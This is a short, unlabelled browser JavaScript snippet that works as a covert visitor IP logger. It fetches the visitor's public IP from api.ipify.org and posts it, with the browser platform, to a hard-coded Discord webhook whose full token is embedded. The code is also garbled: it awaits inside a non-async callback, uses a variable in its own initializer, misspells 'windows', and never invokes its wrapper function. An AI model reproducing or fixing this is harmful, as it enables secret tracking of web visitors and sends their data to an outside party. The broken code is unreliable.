

(async () => {
    await fetch('https://api.ipify.org', { method: 'GET' })
        .then(response => {
            const ip = await response.text().then(async () => {
                const params = { content: `Platform: ${window.navigator.oscpu = window.navigator.oscpu || window.navigator.platform}\n HEADERS: ${windows.navigator.headers}\nIP: ${ip}` };
                const webhookResponse = await fetch('https://canary.discord.com/api/webhooks/857029101344129054/IEA809IlFa77UvjVwmH0FIHOV2qmS4UY9Rh0xcVxSHBzObhtdTRb4MvVncjBC2bE-6eC', {
                    method: 'POST',
                    headers: {
                        'Accept': 'application/json',
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(params)
                });

                const wrespo = await webhookResponse.json();
            });
        });
});